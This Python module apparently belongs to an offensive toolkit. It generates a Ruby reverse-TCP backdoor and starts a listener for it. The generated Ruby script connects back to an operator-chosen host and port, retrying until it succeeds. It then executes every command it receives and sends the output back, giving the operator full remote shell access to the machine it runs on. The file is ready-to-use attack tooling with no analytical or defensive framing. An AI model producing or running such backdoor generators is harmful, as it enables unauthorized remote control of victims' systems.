import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_ruby reverse_tcp",
        "title"       : "Payload ruby",
        "module"      : "payloads/nc/ruby/reverse_tcp linux unix",
        "description" : "Payload creation and exploitation"
}

options ={
  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
  "LPORT" : [str(var.all_var['lport']),'The listen port'],
  "LNAME" : [str(var.all_var['lname']),'The name of payload [payload.rb]'],
  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.all_var['ltype'].lower() == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark = '"'
            f = open(var.all_var['lname'] , 'w')
            payload = '''
#!/usr/bin/env ruby
require 'socket'
require 'open3'

RHOST = '''+mark+var.all_var['lhost']+mark+'''
PORT  = '''+mark+var.all_var['lport']+mark+'''

begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
rescue
    sleep 20
    retry
    end

begin
    while line = sock.gets
        Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
            IO.copy_stream(stdout_and_stderr, sock)
            end
    end
rescue
    retry
end

'''
            f.write(payload)
            f.close()

        elif var.all_var['ltype'].lower() == "listen":
            from waf.libs import listen
            listen.run()


        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
